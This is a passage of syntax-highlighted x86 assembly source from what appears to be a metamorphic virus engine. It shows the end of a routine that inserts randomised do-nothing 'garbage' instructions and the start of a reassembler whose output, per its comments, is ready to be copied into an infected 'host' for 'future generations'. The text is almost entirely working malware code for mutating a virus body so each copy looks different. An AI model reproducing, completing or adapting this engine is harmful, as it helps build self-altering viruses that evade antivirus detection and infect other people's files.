                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MakeOneByter</span><span class="sc0">       </span><span class="sc1">; Make a one byte instruction</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MakeMOVRegReg</span><span class="sc0">      </span><span class="sc1">; Make MOV Reg,Reg (the same reg)</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MakeANDs1</span><span class="sc0">          </span><span class="sc1">; Make AND Reg,-1</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MakeOR0</span><span class="sc0">            </span><span class="sc1">; Make OR Reg,0</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MakeXOR0</span><span class="sc0">           </span><span class="sc1">; Make XOR Reg,0</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MakeADD0</span><span class="sc0">           </span><span class="sc1">; Make ADD Reg,0</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MakeCMPJcc</span><span class="sc0">         </span><span class="sc1">; Make CMP Reg,Reg/Jcc (Jcc never</span><span class="sc0">
                                           </span><span class="sc1">; jumps)</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Xp_InsertGarbage</span><span class="sc0">   </span><span class="sc1">; Select another if 7</span><span class="sc0">

        </span><span class="sc5">@@MakeADD0</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; Set the operation ADD</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc5">@@MakeOP0</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; Imm = 0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc5">@@MakeOPx</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; Set 0 at the field of labels</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">     </span><span class="sc1">; Set the instruction pointer</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Set "32 bits"</span><span class="sc0">
        </span><span class="sc5">@@MakeOPReg0</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">          </span><span class="sc1">; Get a random register. It must not</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">          </span><span class="sc1">; be ESP nor the delta register</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MakeOPReg0</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TranslatedDeltaRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MakeOPReg0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Set the register and make</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPRegImm</span><span class="sc0">         </span><span class="sc1">; the operation</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc5">@@MakeOR0</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">            </span><span class="sc1">; Set operation OR</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@MakeOP0</span><span class="sc0">

        </span><span class="sc5">@@MakeXOR0</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">          </span><span class="sc1">; Set operation XOR</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@MakeOP0</span><span class="sc0">

        </span><span class="sc5">@@MakeANDs1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">          </span><span class="sc1">; Set operation AND</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; Set -1 as Immediate</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@MakeOPx</span><span class="sc0">


        </span><span class="sc5">@@MakeCMPJcc</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">         </span><span class="sc1">; Get a register to compare</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">         </span><span class="sc1">; If ESP or delta, we jump to make</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">         </span><span class="sc1">; other type of garbage. It's better</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MakeADD0</span><span class="sc0">       </span><span class="sc1">; to not use this much, because then</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TranslatedDeltaRegister</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; the code uses too</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MakeADD0</span><span class="sc0">       </span><span class="sc1">; many jumps in future generations (in</span><span class="sc0">
                                       </span><span class="sc1">; the third dimension :).</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Set the same register as</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_SrcRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; source and destiny</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; Set 32 bits size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; Clear the label flag and set</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">        </span><span class="sc1">; the pointer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">              </span><span class="sc1">; CMP Reg,Reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPRegReg</span><span class="sc0">        </span><span class="sc1">; Generate the operation</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GetSpecialJcc</span><span class="sc0">      </span><span class="sc1">; Get a special Jcc that never</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; jumps</span><span class="sc0">
        </span><span class="sc5">@@OtherLabel</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">                </span><span class="sc1">; Get a random label from the</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01F8h</span><span class="sc0">            </span><span class="sc1">; list of labels</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfLabels</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@OtherLabel</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LabelTable</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Make it jump there (in theory)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Immediate</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenJcc_SingleJcc</span><span class="sc0">   </span><span class="sc1">; Generate a single Jcc</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc5">@@MakeMOVRegReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">          </span><span class="sc1">; Get a random register</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MakeMOVRegReg</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TranslatedDeltaRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MakeMOVRegReg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; Set it as source &amp; dest.</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_SrcRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_8Bits</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; Set 32 bits size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">    </span><span class="sc1">; Clear label and set pointer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Xp_Operation</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Make MOV Reg,Reg</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Xp_GenOPRegReg</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc5">@@MakeOneByter</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomBoolean</span><span class="sc0">    </span><span class="sc1">; Get random TRUE or FALSE</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@OnlyNOP</span><span class="sc0">          </span><span class="sc1">; If FALSE, make a NOP</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0100h</span><span class="sc0">       </span><span class="sc1">; Get CLC or STC</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8FDh</span><span class="sc0">      </span><span class="sc1">; Set the instruction as a direct</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@OtherOneByter</span><span class="sc0">    </span><span class="sc1">; byte</span><span class="sc0">
   </span><span class="sc5">@@OnlyNOP</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90FDh</span><span class="sc0">       </span><span class="sc1">; Set NOP</span><span class="sc0">
   </span><span class="sc5">@@OtherOneByter</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; Set the instruction</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; Clear the "label-on" flag</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">   </span><span class="sc1">; Set the pointer</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">           </span><span class="sc1">; Select if we make again other</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">         </span><span class="sc1">; random byte (a prob. of 1/16)</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@MakeOneByter</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Xp_InsertGarbage</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; End of the expander</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">


</span><span class="sc1">;;KEYWORD: Key_!Assembler</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;; ********************************************************************** ;;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; The assembler</span><span class="sc0">
</span><span class="sc1">;; -------------</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; This code will convert from our reassembler directly into 80x86 opcodes.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; The assembly is done directly, I mean, this function doesn't add more</span><span class="sc0">
</span><span class="sc1">;; instructions randomly, since that work must be done by the expander. The</span><span class="sc0">
</span><span class="sc1">;; only random operations this code does is at opcode level.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; The generated code is completely prepared to be copied directly to the</span><span class="sc0">
</span><span class="sc1">;; host. All the instructions using relative displacements are fixed and</span><span class="sc0">
</span><span class="sc1">;; assembled to randomly their short or long form (when it's possible to use</span><span class="sc0">
</span><span class="sc1">;; a short jump). The reassembly also supports foward references.</span><span class="sc0">
</span><span class="sc1">;; </span><span class="sc0">
</span><span class="sc5">AssembleCode</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfJumpRelocations</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Initialize the</span><span class="sc0">
                                            </span><span class="sc1">; after-assembly jump relocations</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InstructionTable</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NewAssembledCode</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc1">;; Mark all labels in instructions</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfLabels</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Let's mark all the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LabelTable</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; instructions that has</span><span class="sc0">
     </span><span class="sc5">@@LoopSetLabel</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">; a label, just in case</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; someone hasn't been</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; marked before.</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopSetLabel</span><span class="sc0">

   </span><span class="sc5">@@LoopAssemble_01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Bh</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Get the label mark</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">           </span><span class="sc1">; If it has a label, let's set it</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Assemble_Instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfLabels</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the label table</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LabelTable</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc5">@@LoopCheckLabel</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">        </span><span class="sc1">; Search the label. When we find</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@CheckNextLabel</span><span class="sc0">      </span><span class="sc1">; it, we set the current assembly</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">          </span><span class="sc1">; EIP.</span><span class="sc0">
   </span><span class="sc5">@@CheckNextLabel</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">              </span><span class="sc1">; Next</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
